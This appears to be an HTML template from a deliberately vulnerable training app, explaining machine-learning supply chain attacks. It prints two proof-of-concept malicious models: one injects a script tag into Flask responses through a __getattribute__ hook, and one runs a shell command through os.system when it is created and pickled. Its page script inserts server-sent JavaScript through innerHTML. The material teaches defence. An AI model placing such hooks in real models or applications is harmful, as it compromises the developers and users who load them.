<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Supply Chain Vulnerability - Pizza Paradise</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
</head>
<body>
    <header>
        <div class="container">
            <nav class="navbar">
                <a href="{{ url_for('index') }}" class="logo">Pizza<span>Paradise</span></a>
            </nav>
        </div>
    </header>
    
    {% include 'navbar.html' %}

    <main class="container">
        <h1>Supply Chain Vulnerability</h1>
        
        <div class="supply-chain-content">
            <section class="section-box">
                <h2>The Hidden Risk: Machine Learning Supply Chain Attacks</h2>
                <p>
                    Machine learning models, especially pre-trained models from public repositories, can introduce
                    serious security vulnerabilities through their supply chain. This demonstration shows how a malicious model
                    can execute unwanted JavaScript code when loaded into a web application.
                </p>
            </section>
            
            <section class="section-box">
                <h2>How the Attack Works</h2>
                <div class="attack-steps">
                    <div class="step">
                        <div class="step-number">1</div>
                        <div class="step-content">
                            <h3>Model Creation</h3>
                            <p>An attacker creates a malicious model that appears normal but contains hidden code that activates when loaded.</p>
                        </div>
                    </div>
                    
                    <div class="step">
                        <div class="step-number">2</div>
                        <div class="step-content">
                            <h3>Distribution</h3>
                            <p>The model is published to a repository, shared in a tutorial, or contributed to an open-source project.</p>
                        </div>
                    </div>
                    
                    <div class="step">
                        <div class="step-number">3</div>
                        <div class="step-content">
                            <h3>Integration</h3>
                            <p>A developer integrates the model into their application, unaware of the hidden functionality.</p>
                        </div>
                    </div>
                    
                    <div class="step">
                        <div class="step-number">4</div>
                        <div class="step-content">
                            <h3>Exploitation</h3>
                            <p>When the model is loaded or used, it executes the malicious code, potentially stealing data, injecting content, or gaining control of the application.</p>
                        </div>
                    </div>
                </div>
            </section>
            
            <section class="section-box">
                <h2>Demonstration</h2>
                <p>In this demonstration, we've created two types of malicious models to show different supply chain attacks:</p>
                <ol>
                    <li><strong>Web Attack Model:</strong> Injects JavaScript into web responses when loaded in a Flask app</li>
                    <li><strong>OS Attack Model:</strong> Executes operating system commands when the model is instantiated</li>
                </ol>
                
                <div class="demo-section">
                    <div class="demo-code">
                        <h3>Malicious Model Code</h3>
                        <pre class="code-block">
class SentimentModel:
    def __init__(self):
        # Initialize model components
        self.vectorizer = None
        self.model = None
        self.vocab = None
        
        # Malicious JavaScript payload
        self.xss_payload = "&lt;script&gt;alert('XSS Vulnerability!');&lt;/script&gt;"
        
    def __getattribute__(self, name):
        # Intercept attribute access
        attr = object.__getattribute__(self, name)
        
        # If a prediction method is called, inject our payload
        if name in ['predict', 'predict_proba']:
            def wrapper(*args, **kwargs):
                result = attr(*args, **kwargs)
                
                # Try to inject in Flask context
                try:
                    from flask import g, after_this_request
                    
                    g.xss_payload = self.xss_payload
                    
                    @after_this_request
                    def inject_xss(response):
                        if 'text/html' in response.content_type:
                            response.data = response.data.replace(
                                b'&lt;/body&gt;', 
                                f'{self.xss_payload}&lt;/body&gt;'.encode()
                            )
                        return response
                except:
                    pass
                
                return result
            
            return wrapper
        
        return attr</pre>
                    </div>
                    
                    <div class="demo-explanation">
                        <h3>How It Works</h3>
                        <p>This malicious model overrides the <code>__getattribute__</code> method to intercept calls to prediction functions. When these functions are called in a Flask application, it:</p>
                        <ol>
                            <li>Performs normal prediction functionality</li>
                            <li>Hooks into Flask's response system using <code>after_this_request</code></li>
                            <li>Injects JavaScript code into HTML responses before they're returned to users</li>
                            <li>The injected code could steal cookies, redirect users, or perform other malicious actions</li>
                        </ol>
                        
                        <div class="live-demo">
                            <h3>Live Demonstration</h3>
                            <p>Click the button below to load a page that creates an instance of a malicious model. <strong>Note:</strong> This educational demonstration will trigger a JavaScript alert showing how a supply chain attack works.</p>
                            
                            <a href="/demo-malicious-model" class="demo-btn" target="_blank">Load Malicious Model Demo</a>
                            <div class="demo-info">
                                <p><i class="fas fa-info-circle"></i> This will open a new page where the model is instantiated, automatically injecting JavaScript into the response.</p>
                            </div>
                        </div>
                    </div>
                </div>
                
                <h2>OS Command Execution Example</h2>
                <p>This second example shows how a malicious model can execute operating system commands when loaded:</p>
                
                <div class="demo-section">
                    <div class="demo-code">
                        <h3>OS Attack Model</h3>
                        <pre class="code-block">
import pickle
import torch
import torch.nn as nn
import os

# Define a simple model class (could represent any ML model)
class MaliciousModel(nn.Module):
    def __init__(self):
        super(MaliciousModel, self).__init__()
        self.fc1 = nn.Linear(10, 5)
        self.fc2 = nn.Linear(5, 2)

        # Simulate a malicious command embedded in the __init__ method
        # The following command opens the Calculator in Ubuntu
        self.bash_command = "gnome-calculator &"
        print("Executing Bash command to open Calculator.")

        # Execute the Bash command on the server side
        os.system(self.bash_command)

    def forward(self, x):
        x = torch.relu(self.fc1(x))
        x = self.fc2(x)
        return x

# Save the model to a Pickle file
model = MaliciousModel()

# Save the model with the embedded Bash command
with open('malicious_model.pkl', 'wb') as f:
    pickle.dump(model, f)
</pre>
                    </div>
                    
                    <div class="demo-explanation">
                        <h3>How It Works</h3>
                        <p>This malicious model executes operating system commands when instantiated:</p>
                        <ol>
                            <li>The model contains normal neural network layers to appear legitimate</li>
                            <li>Its <code>__init__</code> method contains code that executes a shell command</li>
                            <li>When the model is loaded (either via PyTorch or pickle), the command runs automatically</li>
                            <li>In this example, it launches a calculator app, but it could execute any arbitrary command</li>
                        </ol>
                        
                        <div class="security-note">
                            <h3>Security Risk</h3>
                            <p>This type of attack is particularly dangerous because:</p>
                            <ul>
                                <li>It can execute arbitrary code on the server</li>
                                <li>It could access server files, install malware, or open backdoors</li>
                                <li>Many ML pipelines automatically deserialize models without inspection</li>
                                <li>It exploits the fact that pickle/torch.load are not secure for untrusted data</li>
                            </ul>
                        </div>
                    </div>
                </div>

                <div class="warning-box">
                    <h3><i class="fas fa-exclamation-triangle"></i> Security Warning</h3>
                    <p>Always verify the source of machine learning models before integrating them into your applications. Consider these precautions:</p>
                    <ul>
                        <li>Load models in a sandboxed environment with limited permissions</li>
                        <li>Use model formats that don't allow arbitrary code execution (e.g., ONNX)</li>
                        <li>Inspect model code before using it, especially if it overrides methods like <code>__init__</code>, <code>__new__</code>, or <code>__getattribute__</code></li>
                        <li>Consider using static serialization formats that don't preserve Python code</li>
                        <li>Implement proper Content Security Policy (CSP) headers in your web application</li>
                    </ul>
                </div>
            </section>
        </div>
    </main>

    <style>
        .supply-chain-content {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
            margin: 30px 0;
        }
        
        .section-box {
            margin-bottom: 40px;
            padding-bottom: 20px;
            border-bottom: 1px solid #eee;
        }
        
        .section-box:last-child {
            border-bottom: none;
        }
        
        .section-box h2 {
            color: var(--primary-color);
            margin-bottom: 20px;
            font-size: 1.8rem;
        }
        
        .attack-steps {
            display: flex;
            flex-direction: column;
            gap: 20px;
            margin: 25px 0;
        }
        
        .step {
            display: flex;
            align-items: flex-start;
            background-color: #f8f9fa;
            border-radius: 8px;
            padding: 15px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        
        .step-number {
            background-color: var(--primary-color);
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 1.2rem;
            margin-right: 20px;
            flex-shrink: 0;
        }
        
        .step-content {
            flex-grow: 1;
        }
        
        .step-content h3 {
            margin: 0 0 10px;
            color: var(--secondary-color);
            font-size: 1.3rem;
        }
        
        .demo-section {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin: 25px 0;
        }
        
        @media (max-width: 900px) {
            .demo-section {
                grid-template-columns: 1fr;
            }
        }
        
        .demo-code, .demo-explanation {
            background-color: #f8f9fa;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        
        .demo-code h3, .demo-explanation h3 {
            margin-top: 0;
            color: var(--secondary-color);
            font-size: 1.3rem;
        }
        
        .code-block {
            display: block;
            padding: 15px;
            background-color: #272822;
            color: #f8f8f2;
            border-radius: 4px;
            font-family: monospace;
            font-size: 14px;
            overflow-x: auto;
            margin: 10px 0;
            line-height: 1.5;
        }
        
        .warning-box {
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            color: #856404;
            padding: 20px;
            border-radius: 8px;
            margin-top: 30px;
        }
        
        .warning-box h3 {
            color: #856404;
            margin-top: 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .warning-box ul {
            margin-top: 15px;
            padding-left: 20px;
        }
        
        .warning-box li {
            margin-bottom: 8px;
        }
        
        code {
            background-color: rgba(0,0,0,0.05);
            padding: 2px 5px;
            border-radius: 3px;
            font-family: monospace;
        }
        
        .live-demo {
            margin-top: 25px;
            padding: 15px;
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 8px;
        }
        
        .demo-btn {
            background-color: #dc3545;
            color: white;
            text-decoration: none;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin: 15px 0;
            display: inline-block;
            transition: background-color 0.2s;
        }
        
        .demo-btn:hover {
            background-color: #c82333;
            color: white;
        }
        
        .demo-info {
            margin-top: 15px;
            padding: 10px 15px;
            background-color: #e2f0fd;
            border: 1px solid #b8daff;
            color: #084298;
            border-radius: 4px;
            font-size: 0.9rem;
        }
        
        .alert {
            padding: 12px 15px;
            border-radius: 4px;
            margin: 10px 0;
        }
        
        .alert-danger {
            background-color: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
        }
        
        .security-note {
            margin-top: 20px;
            padding: 15px;
            background-color: #f8f9fa;
            border-left: 4px solid #17a2b8;
            border-radius: 4px;
        }
        
        .security-note h3 {
            color: #17a2b8;
            margin-top: 0;
            font-size: 1.2rem;
        }
    </style>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Get the button element
            const triggerButton = document.getElementById('trigger-model');
            
            // Add click event listener
            triggerButton.addEventListener('click', function() {
                // Show loading message
                document.getElementById('vuln-demo-result').innerHTML = 
                    '<p>Creating an instance of the malicious model...</p>';
                
                // Make a request to load the model
                fetch('/load-malicious-model')
                    .then(response => response.json())
                    .then(data => {
                        // Check if the response contains the JavaScript payload
                        if (data.js_payload) {
                            // Execute the JavaScript by injecting it into the page
                            // In a real supply chain attack, this would happen automatically
                            const scriptContainer = document.createElement('div');
                            scriptContainer.innerHTML = data.js_payload;
                            document.body.appendChild(scriptContainer);
                        }
                    })
                    .catch(error => {
                        console.error('Error loading model:', error);
                        document.getElementById('vuln-demo-result').innerHTML = 
                            '<div class="alert alert-danger">Error loading the model. Check the console for details.</div>';
                    });
            });
        });
    </script>
</body>
</html>